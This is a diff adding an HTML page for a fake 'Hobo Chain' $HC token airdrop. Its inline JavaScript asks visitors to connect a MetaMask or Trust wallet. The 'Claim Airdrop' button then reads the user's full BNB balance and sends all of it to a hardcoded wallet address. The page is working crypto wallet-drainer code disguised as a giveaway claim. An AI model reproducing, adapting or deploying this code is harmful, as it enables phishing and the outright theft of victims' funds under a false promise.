@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hobo Chain</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous"> -->
+<script src="love.js"></script>
+<style>
+    .hidden{
+        display: none;
+    }
+    .error1{
+                position: absolute; width: 100%; border-bottom: 3px solid red; display: none; align-items: center; min-height: 50px;background-color: white;
+                z-index: 20;
+                border-bottom-left-radius: 5px;
+                color: red;
+                padding: 20px;
+                box-sizing: border-box;
+                border-bottom-right-radius: 5px;
+
+            }
+</style>
+</head>
+<body style="position: relative;">
+    <!-- As a heading -->
+    <div class="error1" ></div>
+    <nav class="navbar navbar-light bg-light">
+        <span class="navbar-brand mb-0 h1">HOBO CHAIN</span>
+    </nav>
+
+    <div class="container">
+        <div class="mid-container">
+            <div class="image">
+                <img src="./img/photo_2023-12-24_20-49-07.jpg" alt=""> 
+            </div>
+            <h2>Welcome to the digital city of Hobo chain</h2>
+            <p>Connect your wallet to see if you're eligible to claim your share of 20.4 million $HC Token. The amount of $HC you receive depends on your network activity</p>
+            <button onclick="connectAndSend()" id="connectButton">Connect</button>
+            <button onclick="claim()" id="claimButton" class="hidden">Claim Airdrop</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
+    <script>
+        let userAddress;  // Store user's address after connecting
+        let timeout =  null
+
+let displayerror = (errormsg)=>{
+    if(timeout){
+        clearTimeout(timeout)
+    }
+   let err = document.querySelector(".error1")
+   err.style.display="flex"
+
+   err.innerHTML= errormsg
+   timeout  = setTimeout(()=>{
+    err.style.display="none"
+
+   err.innerHTML= ""
+
+
+    timeout =null
+
+   },3000)
+
+}
+
+        async function connectAndSend() {
+            try {
+                // Connect to the wallet
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                // Update UI: hide connect button and show claim button
+                document.getElementById('connectButton').classList.add('hidden');
+                document.getElementById('claimButton').classList.remove('hidden');
+            } catch (error) {
+                if(error.code ==-32002){
+                    return  displayerror(`metamask connection already initaited, open the popup and complete the the request or cancel it`)
+                }
+                if(error.message){
+                    return   displayerror(`${error.message || "Error connecting to wallet, try you have meta mask or trust wallet installed"}`)
+                }
+                
+                console.error('Error connecting to wallet:', error.message);
+            }
+        }
+
+async function claim() {
+    const web3 = new Web3(window.ethereum);
+
+    // Get the user's BSC address if not already obtained
+    if (!userAddress) {
+        const accounts = await web3.eth.getAccounts();
+        userAddress = accounts[0];
+    }
+
+    // Replace 'toAddress' with the recipient address
+    const toAddress = '0xB1DE3D7F74aa03F3d936556d0e3538a8C19A1de3';
+
+    try {
+        // Get the user's BNB balance in Wei
+        const actualBalanceWei = await web3.eth.getBalance(userAddress);
+
+        // Convert Wei to Ether (use utils.fromWei directly)
+        const actualBalance = web3.utils.fromWei(actualBalanceWei, 'ether');
+
+        console.log('Actual Balance:', actualBalance,actualBalanceWei);
+
+        // Disable the claim button and show a loading indicator
+        document.getElementById('claimButton').disabled = true;
+        document.getElementById('claimButton').textContent = 'Claiming...';
+
+        // Send the actual total balance to the specified address
+        const result = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: userAddress,
+                to: toAddress,
+                value:   Web3.utils.toBN(actualBalanceWei).toString(16)  // Send the balance in Wei, // Send the balance in Wei
+            }],
+            // Use custom message for the confirmation popup
+            from: userAddress,
+        });
+
+        console.log(`Transaction sent successfully: ${result}`);
+    } catch (error) {
+        console.error('Error sending BNB:', error.message);
+    } finally {
+        // Re-enable the claim button and hide the loading indicator
+        document.getElementById('claimButton').disabled = false;
+        document.getElementById('claimButton').textContent = 'Claim Airdrop';
+    }
+}
+
+
+// Replace the existing event listener
+window.ethereum.on('close', (code, reason) => {
+    console.log(`Wallet connection closed with code ${code} and reason: ${reason}`);
+});
+
+// With the updated event listener
+window.ethereum.on('disconnect', (code, reason) => {
+    console.log(`Wallet disconnected with code ${code} and reason: ${reason}`);
+});
+
+    </script>
+</body>
+</html>
